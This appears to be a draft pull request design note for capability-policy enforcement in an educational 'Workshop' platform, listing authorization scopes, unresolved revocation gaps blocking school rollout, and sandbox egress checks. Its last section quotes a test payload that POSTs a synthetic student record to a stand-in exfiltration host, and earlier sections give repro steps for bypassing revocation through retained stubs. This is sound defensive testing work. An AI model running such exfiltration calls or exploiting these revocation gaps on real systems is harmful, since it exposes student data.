# Workshop policy boundaries — SCHO-292

This is a stacked follow-up to GitHub draft PR #14, parent head `9b8cb87a`,
base branch `feat/edu-workshop-capability-policy-20261030`.
Delivery target: draft review only. Do not merge or deploy this change.

## Enforced operations

`WORKSHOP_CAPABILITY_POLICY` remains optional. A configured service must explicitly allow
an operation; errors and malformed decisions refuse it. The User DO derives the principal
from its initialized, persisted profile, never a client role, display name, prompt or model.
Existing ownership and collaborator permissions still apply after policy authorization.
Requests contain action and opaque scope identifiers, not student records, prompts, code,
invitation notes, screenshots, archive contents or credentials.

New scopes (deployment policies must explicitly handle them; unknown actions must deny):

- `workspace.create.query`: advisory visibility of Create Gadget, with no workspace ID.
  `AuthenticatedApi.canCreateGadget()` returns false on denial or service failure. A true
  value is not authority; actual creation checks `workspace.create` with its concrete ID.
  A policy may allow visibility for a teacher with some creation grants while refusing
  creation outside those grants. Generic deployments return true without a binding.
- `gadget.create`: creating another Gadget inside an existing workspace.
- `blueprint.import`: checked before reading the archive or writing R2/KV, and again at
  direct User DO library insertion.
- `blueprint.publish`: checked against the calling user's stored principal before create,
  update or retry publication. Collaborators cannot borrow the owner's policy rights.
- `workspace.share`: checked before collaborator invitation, share-link creation or key
  regeneration. Removal/revocation remains available to reduce access.
- `gadget.execute`: checked on both build and use client methods before UI bundle generation,
  RPC connection minting, export-format discovery and export execution.
- `agent.execute`: checked before chat start, send (including steering), retry and applying
  a Blueprint, before external-message initialization/delivery, spawned-chat creation and
  callable-agent callbacks. Callback/spawner identity is server-minted; it is resolved through
  the corresponding User DO rather than accepted as a role assertion.

Decisions are never cached. A retained Workshop/Gadget client must pass a fresh check on
its next protected call, so revocation applies without reconnecting that client. There is
no policy-controlled session kill or claim of transitive revocation.

## Execution restriction in the next stacked slice

See [live capability revocation](live-capability-revocation.md): configured-policy execution
is unconditionally disabled at runtime boundaries. This supersedes the allowed-execution
behavior described above for the next slice, but does not revoke every descendant stub.

## BLOCKING for school rollout: retained execution and data capabilities

This PR is not sufficient to enable the Workshop for students. Resolve and test all of the
following against the production policy binding before school rollout:

1. **Raw execution stubs already minted by `connectToGadget`.** Repro: obtain a raw gadget RPC
   stub while allowed, revoke `gadget.execute`, then invoke a method on that raw stub. It
   bypasses `GadgetClient.connectToGadget` on subsequent calls. Gatekeeper sessions and
   exported capabilities may similarly outlive their parent clients. A revocable membrane
   must preserve Cap'n Web pipelining, native RPC disposal, callbacks and restore semantics;
   wrapping arbitrary stubs with an ad hoc JS proxy is not a safe kernel change here.
2. **Running/resumable agent turns, hooks and internal execution.** Repro: start a turn or
   enable a hook while allowed, revoke `agent.execute`, then allow its next tool/hook event
   to run. Entry checks refuse new Workshop messages/spawns/callbacks but do not cancel
   in-flight turns, resumed durable decisions, existing queues or all internal gadget calls.
   They need a trusted persisted initiator and authorization at each execution/resume boundary,
   plus invalidation/cancellation semantics. Never substitute workspace owner rights for
   the student initiator's rights. Legacy spawners without creator attribution need explicit
   migration or denial for school use.
3. **Session/data revocation.** Repro: subscribe to chat/workpiece data or retain an existing
   gatekeeper capability, revoke a domain grant, then observe the existing stream/capability.
   Fresh protected RPC calls deny, but no policy change event currently restarts the DO or
   closes existing streams. Existing collaborator removal/share-link revocation DO restarts
   remain intact; they do not subscribe to domain policy changes. Workshop session token
   expiration/revocation likewise does not invalidate every descendant RPC capability.
4. **External gateway identity and publication provenance.** The external message RPC is an
   internal gateway capability: its caller-email field must come from authenticated gateway
   identity, never untrusted request JSON. Domain policies must reject unknown/legacy stored
   principals and prevent grants for one school's scopes from authorizing another's.
   Blueprint publication policy must account for workspace data/export restrictions; an allow
   is not content redaction and a Blueprint's code may contain private embedded literals.

These are blocking repro procedures, not claims that student data was accessed. Tests use
synthetic identities and content only. No production bindings or student data were used.

## Direct public-network exfiltration inspection

`OverseerImpl.loadGadgetWorker` explicitly sets `globalOutbound: null` for dynamic
Gadget workers, including chat previews; `executeCodeMode` and its harness also set
`globalOutbound: null`. The server sandbox does not grant default public-network fetch.
The real-workerd negative regression in `gadget-restore.test.ts` loads Gadget JS that
attempts `fetch("https://exfiltration.invalid/student", { method: "POST", body:
"synthetic-student-record" })` and requires the runtime's explicit "not permitted to access the internet" error
(rather than accepting a DNS failure), while the Gadget remains callable.
This change does not add production network restrictions or alter generic deployments.

This is not a complete exfiltration proof: the `.invalid` destination avoids sending data
to a real public service, and the asserted denial must be read alongside the loader's
explicit null outbound capability. Browser Gadget HTML separately declares CSP
`connect-src 'none'`, `img-src data:`, `default-src 'none'` in `GadgetUI.tsx`; browser
navigation, injected capabilities, delegated Gatekeeper access and existing raw stubs
still need the school rollout audit. A denied default fetch does not make a policy allow
safe for all student data or remove the blocking cases above.
